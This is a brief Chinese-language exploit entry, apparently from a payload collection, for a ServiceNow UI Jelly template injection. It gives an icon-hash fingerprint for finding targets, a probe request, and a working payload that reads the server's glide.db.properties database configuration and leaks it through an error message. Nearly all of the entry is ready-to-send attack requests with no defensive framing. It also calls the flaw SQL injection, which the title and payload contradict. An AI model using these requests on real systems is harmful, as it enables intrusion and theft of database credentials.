# ServiceNowUIJelly模板注入漏洞

- **系统**：ServiceNowUIJelly　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="1701804003"`
- **请求**：`GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(11111*11111);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1`

**请求体 / payload**
```
读取数据库配置
GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Ez=new%20Packages.java.io.File(%22%22).getAbsolutePath();z=z.substring(0,z.lastIndexOf(%22/%22));u=new%20SecurelyAccess(z.concat(%22/co..nf/glide.db.properties%22)).getBufferedReader();s=%22%22;while((q=u.readLine())!==null)s=s.concat(q,%22%5Cn%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E%22 HTTP/1.1
Host:
```
- **预期**：200　|　—